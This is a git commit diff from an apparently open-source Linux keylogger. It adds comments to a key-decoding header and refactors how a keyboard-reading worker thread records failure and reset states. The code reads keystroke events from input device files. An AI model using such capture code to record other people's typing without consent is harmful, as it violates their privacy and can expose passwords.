511b2283502ee1218e854f4b2983e83a71cf169f
Constantinos Argyriou <rounnus@gmail.com>
2021-11-19 22:54:46 +0200

    Add comments.

--- kb_logger/include/kb_decoder.h
+++ kb_logger/include/kb_decoder.h
@@ -2,11 +2,22 @@
 #ifndef LINUX_KEYLOGGER_KB_DECODER_H
 #define LINUX_KEYLOGGER_KB_DECODER_H
 
+/**
+ * Decoded information contains.
+ */
 struct kb_dec_key {
     char *kb_key_name;
     int   kb_key_code;
 };
 
+/**
+ * Takes a keycode and responds with a structure that
+ * contains both the keycode of the current keystroke
+ * and the name of the key that has been pressed.
+ * @param key_code The key code of interest.
+ * @return on success a structure that contains both the name and the keycode of the keystroke.
+ * On error returns NULL.
+ */
 extern struct kb_dec_key *decode(int key_code);
 
 #endif
--- worker/kb_worker.c
+++ worker/kb_worker.c
@@ -13,9 +13,6 @@
 #include <file/file_handler.h>
 #include <mem.h>
 
-#define DONT_RESET      0
-#define RESET           1
-
 #define FAILED_TO_READ "Failed to read event file"
 #define FAILED_TO_OPEN "Failed to open event file"
 #define DISCONNECTED   "Disconnected"
@@ -26,7 +23,6 @@
 struct kb_worker_cleanup_infos {
     struct kb_worker *kb_worker;
     int    device_file_fd;
-    int    reset;
 };
 
 static void killed_worker(void *arg)
@@ -36,16 +32,13 @@ static void killed_worker(void *arg)
     // Close the open device files.
     if (cleanup_infos->device_file_fd != -1) close(cleanup_infos->device_file_fd);
     // Set worker state.
-    if (cleanup_infos->reset)
+    if (cleanup_infos->kb_worker->kb_status != KB_WORKER_FAILED)
     {
         cleanup_infos->kb_worker->kb_status = KB_WORKER_RESET;
         make_terminal_log(RESETTING, cleanup_infos->kb_worker->kb_id);
+        return;
     }
-    else
-    {
-        cleanup_infos->kb_worker->kb_status = KB_WORKER_FAILED;
-        make_terminal_log(DISCONNECTED, cleanup_infos->kb_worker->kb_id);
-    }
+    make_terminal_log(DISCONNECTED, cleanup_infos->kb_worker->kb_id);
 }
 
 __attribute__((noreturn)) void *start_worker(void *worker)
@@ -55,6 +48,7 @@ __attribute__((noreturn)) void *start_worker(void *worker)
     struct input_event device_event; // Current keyboard device event.
     struct kb_dec_key *decoded;
     char *device_event_path;
+
     ALLOC_MEM(device_event_path, strlen(worker_infos->kb_event_file) + 1, sizeof(char));
     pthread_cleanup_push(killed_worker, (void *) &cleanup_infos);
     strcpy(device_event_path, worker_infos->kb_event_file);
@@ -66,20 +60,19 @@ __attribute__((noreturn)) void *start_worker(void *worker)
         make_terminal_log(FAILED_TO_OPEN, worker_infos->kb_id);
         cleanup_infos.kb_worker = worker_infos;
         cleanup_infos.device_file_fd = -1;
-        cleanup_infos.reset = DONT_RESET;
+        cleanup_infos.kb_worker->kb_status = KB_WORKER_FAILED;
         pthread_exit(0);
     }
     // Save the cleanup data.
     cleanup_infos.kb_worker = worker_infos;
     cleanup_infos.device_file_fd = device_fd;
-    cleanup_infos.reset = RESET;
 
     make_terminal_log(START_CAPTURE, worker_infos->kb_id);
     while (TRUE) {
         if (read(device_fd, &device_event, sizeof(device_event)) == -1)
         {
             make_terminal_log(FAILED_TO_READ, worker_infos->kb_id);
-            cleanup_infos.reset = DONT_RESET;
+            worker_infos->kb_status = KB_WORKER_FAILED;
             pthread_exit(0);
         }
 
